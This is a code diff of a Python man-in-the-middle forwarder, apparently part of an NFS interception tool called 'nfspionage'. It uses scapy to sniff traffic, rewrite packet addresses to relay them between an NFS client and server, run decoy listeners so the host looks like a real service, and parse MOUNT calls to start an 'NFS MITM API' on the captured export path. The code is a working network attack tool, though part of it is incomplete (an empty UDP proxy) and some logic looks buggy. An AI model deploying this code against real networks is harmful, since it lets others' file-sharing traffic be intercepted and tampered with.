@@ -1,164 +1,169 @@
 import _thread
+import ipaddress
 import socket
 import threading
 
-
-from nfs_mitm_api import NfsMitmApi
+from helpers import print_console, print_exception
+from nfspionage_api import NfspionageApi
 from scapy.compat import raw
 from scapy.contrib.mount import MOUNT_Call
 from scapy.contrib.oncrpc import RPC
+from scapy.layers.inet import IP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sniff, sr1
 
-
-def tuple_to_addr(address):
-    return str(address[0]) + ":" + str(address[1])
-
-
-def handle(buffer):
-    return buffer
+'''
+# ==============================================================================
+# MITM FORWARDER ===============================================================
+# ==============================================================================
+'''
 
 
 class MitmForwarder:
-    mount_ports = []
-    spoof_address = None
+	server_address = None
+	spoof_address = None
+	target_port = None
 
-    def __init__(self, remote_ip, port, udp=False):
-        print("// ========================================")
-        print("// Starting MitmForwarder...")
-        print("// [*] LOC Addr:\t127.0.0.1:" + str(port))
-        print("// [*] REM Addr:\t" + remote_ip + ":" + str(port))
-        if udp:
-            print("// [*] PROT:\t\tUDP")
-            self.udp_proxy(remote_ip, port)
-        else:
-            print("// [*] PROT:\t\tTCP")
-            self.tcp_proxy(remote_ip, port)
-        print("// ========================================")
+	client_address = None
+	mount_ports = []
 
-    def update_spoof_address(self, addr):
-        if self.spoof_address is None or self.spoof_address is '127.0.0.1' or self.spoof_address is '0.0.0.0' or self.spoof_address is '':
-            self.spoof_address = addr
+	def __init__(self, remote_ip, port, udp=False):
+		self.server_address = remote_ip
+		self.target_port = port
+		self.spoof_address = remote_ip
+		print_console("// ========================================")
+		print_console("// Starting MitmForwarder", trailing_dots=True)
+		print_console("// LOCAL Addr:\t127.0.0.1:" + str(port))
+		print_console("// REMOTE Addr:\t" + remote_ip + ":" + str(port))
+		if udp:
+			print_console("// PROTOCOL:\t\tUDP")
+			self.udp_proxy()
+		else:
+			print_console("// PROTOCOL:\t\tTCP")
+			self.tcp_proxy()
+		print("// ========================================")
 
-    # ==================== TCP FORWARDING ==================== #
+	def update_client_address(self, packet):
+		if packet[IP].src is not self.server_address:
+			self.client_address = packet[IP].src
 
-    # create tcp servers to listen for and forward connections to target
-    def tcp_proxy(self, target_host, target_port):
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_socket.bind(('', target_port))
-        server_socket.listen(10)
+	# ======================================================== #
+	# ==================== TCP FORWARDING ==================== #
+	# ======================================================== #
+	# tcp_proxy ============================================== #
+	# create tcp servers to listen for and forward connections to target
+	def tcp_proxy(self):
+		print_console("// tcp_proxy ==============================")
 
-        while True:
-            # accept connection from client
-            local_socket, local_address = server_socket.accept()
-            self.update_spoof_address(local_address[0])
+		# create thread for python socket to "accept" messages
+		threading.Thread(target=self.tcp_listen, args=(self.target_port,)).start()
 
-            # create socket to connect to server
-            remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            remote_socket.bind(('', local_address[1]))
-            remote_socket.connect((target_host, target_port))
+		# listen with scapy to actually forward and process
+		str_filter = "tcp and port " + str(self.target_port)
+		print_console("FILTER: " + str(str_filter))
+		print_console("STARTING scapy packet sniffing", trailing_dots=True)
+		sniff(count=0, filter=str_filter, prn=self.transfer_tcp)
+		print_console("STOPPING scapy packet sniffing")
+		print_console("// END tcp_proxy ==========================")
 
-            # create threads for each direction
-            s = threading.Thread(target=self.transfer_tcp, args=(remote_socket, local_socket))
-            r = threading.Thread(target=self.transfer_tcp, args=(local_socket, remote_socket))
-            s.start()
-            r.start()
+	# transfer_tcp ============================================== #
+	# scapy sniff callback function to filter and modify incoming packets
+	# PARAM
+	# pkt (scapy)       - a Scapy packet
+	# RETURN
+	# void
+	def transfer_tcp(self, pkt):
+		if IP in pkt:  # only process packets with IP layer
+			# pkt.show()
 
-    # listens for tcp connections and forwards data from src socket to dst socket
-    def transfer_tcp(self, src, dst):
-        while True:
-            data = src.recv(64512)
-            print("[+ TCP ] " + tuple_to_addr(src.getpeername()) + " >>> " + tuple_to_addr(dst.getpeername()) + " [" + str(len(data)) + "]")
-            dst.send(handle(data))
+			# try to filter
+			try:
+				self.filter_packets(pkt)
+			except Exception as e:
+				print_exception("Filtering packet: " + str(e))
 
-    # ==================== UDP FORWARDING ==================== #
+			# fix check sums
+			pkt[IP].checksum = None  # ask scapy to regenerate
+			src_ether = pkt[Ether].src
+			if Ether in pkt:
+				pkt[Ether].src = None
+				pkt[Ether].dst = None
+				pkt[Ether].checksum = None  # ask scapy to regenerate it
+			pkt[Ether].src = src_ether
 
-    # create udp servers to listen for and forward connections to target
-    def udp_proxy(self, remote_ip, listen_port):
-        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        proxy_socket.bind(('', listen_port))
+			# change src and dst IP appropriately
+			self.update_client_address(pkt)
+			if pkt[IP].src != self.server_address:  # packet is NOT from server -> forward to server
+				# pkt[IP].src = hex(int(ipaddress.IPv4Address(self.client_address)))
+				pkt[IP].dst = str(ipaddress.IPv4Address(self.server_address))
+			else:  # packets is from server -> forward to client
+				# pkt[IP].src = hex(int(ipaddress.IPv4Address(self.server_address)))
+				pkt[IP].dst = str(ipaddress.IPv4Address(self.client_address))
 
-        server_address = (remote_ip, int(listen_port))
-        client_address = None
+			# send packet
+			# pkt.show()
+			print_console("FORWARDING to " + str(pkt[IP].dst), trailing_dots=True)
+			sr1(pkt)
 
-        while True:
-            data, address = proxy_socket.recvfrom(65412)
-            self.filter_packets(data, remote_ip, client_address, server_address)
+	# tcp_listen ============================================== #
+	# create tcp listener on passed host and port, needed so that other hosts
+	# see a 'real program' running on this port
+	# PARAM
+	# host (str)    - host to create socket on
+	# port (int)    - port to create socket on
+	# RETURN
+	# void
+	def tcp_listen(self, port):
+		print_console("LISTEN STARTING: " + str(port), tag="TCP", trailing_dots=True)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.bind(('', port))
+		sock.listen()
+		while True:  # listen forever
+			# msg rcvd -> call this func again to try to create another "client" socket on that port
+			connection, client_address = sock.accept()
+			print_console("CONNECTION on " + str(client_address), tag="TCP")
+			self.tcp_listen(client_address[1])
 
-            #  create spoof socket to send packets from
-            spoof_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            spoof_socket.bind(('', address[1]))
+	# ======================================================== #
+	# ==================== UDP FORWARDING ==================== #
+	# ======================================================== #
 
-            if client_address is None:
-                client_address = address
-            # client addr, send to server (listen on spoof socket for resp)
-            if address == client_address:
-                print(
-                    "[+ UDP ] " + tuple_to_addr(client_address) + " >>> " + tuple_to_addr(server_address) + " [" + str(
-                        len(data)) + "]")
-                spoof_socket.sendto(data, server_address)
-                self.udp_listen(spoof_socket, proxy_socket)
-            # server addr, send to client
-            elif address == server_address:
-                print(
-                    "[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
-                        len(data)) + "]")
-                proxy_socket.sendto(data, client_address)
-                client_address = None
-            # unknown addr, send to server
-            else:
-                print(
-                    "[+ UDP ] " + tuple_to_addr(server_address) + " >>> " + tuple_to_addr(client_address) + " [" + str(
-                        len(data)) + "]")
-                proxy_socket.sendto(data, client_address)
-                client_address = None
+	# udp_proxy ============================================== #
+	# create udp servers to listen for and forward connections to target
+	def udp_proxy(self):
+		pass
 
-    @staticmethod
-    def udp_listen(src, dst):
-        data, address = src.recvfrom(65412)
-        src.sendto(data, dst.getsockname())
+	# ========================================================== #
+	# ==================== PACKET FILTERING ==================== #
+	# ========================================================== #
 
-    # ==================== PACKET FILTERING ==================== #
+	# filter_packets =========================================== #
+	# filter packets for data of interest - i.e., mount port
+	# PARAM
+	# pkt (scapy)       - a Scapy packet
+	# RETURN
+	# void
+	def filter_packets(self, pkt):
+		# filter path, start mitm API
+		path = self.filter_mount_path(pkt)
+		if path != -1:  # if proper mount path, start API on path for clients
+			print_console("STARTING NFS MITM API on path \'" + path + "\'", trailing_dots=True)
+			_thread.start_new_thread(NfspionageApi, (self.server_address, path))
 
-    # filter packets for data of interest - i.e., mount port and mount path
-    def filter_packets(self, data, remote_ip, client_address, server_address):
-        port = self.filter_mount_port(data)
-        if port != -1 and port not in self.mount_ports and client_address is not server_address:
-            print("[* INF ] starting forwarders on port " + str(port))
-            _thread.start_new_thread(MitmForwarder, (remote_ip, port))
-            _thread.start_new_thread(MitmForwarder, (remote_ip, port, True))
-            self.mount_ports.append(port)
-
-        # filter path, start mitm API
-        path = self.filter_mount_path(data)
-        if path != -1:
-            print("[* INF ] starting NFS MITM API on path \'" + path + "\'")
-            _thread.start_new_thread(NfsMitmApi, (remote_ip, path))
-
-    @staticmethod
-    def filter_mount_port(data):
-        try:  # get port number from last few bytes
-            sz = len(data)
-            x = data[sz - 2:sz]
-            tmp = x.hex()
-            port = int(tmp, 16)
-
-            if port != 0 and port > 100:
-                print("[* INF ] MOUNT on port " + str(port))
-                return port
-            else:
-                return -1
-        except Exception as e:  # error getting mount port
-            # str("[- EXP ] " + str(e))
-            return -1
-
-    @staticmethod
-    def filter_mount_path(data):
-        try:  # try to convert to MOUNT_Call packet
-            mnt_pckt = RPC(MOUNT_Call(raw(data)))
-            path = mnt_pckt.path.path.decode('utf-8')
-            print("[* INF ] MOUNT on path " + path)
-            return path
-        except Exception as e:  # error getting mount path
-            # print("[- EXP ] " + str(e))
-            return -1
-
+	# filter_mount_path =========================================== #
+	# filter mount path out of packet
+	# PARAM
+	# pkt (scapy)       - a Scapy packet
+	# RETURN
+	# str       - mount path
+	# -1        - ERROR
+	@staticmethod
+	def filter_mount_path(pkt):
+		try:  # try to convert to MOUNT_Call packet
+			mnt_pkt = RPC(MOUNT_Call(raw(pkt)))
+			path = mnt_pkt.path.path.decode('utf-8')
+			print_console("MOUNT on path " + path)
+			return path
+		except Exception as e:  # error getting mount path
+			# print("[- EXP ] " + str(e))
+			return -1
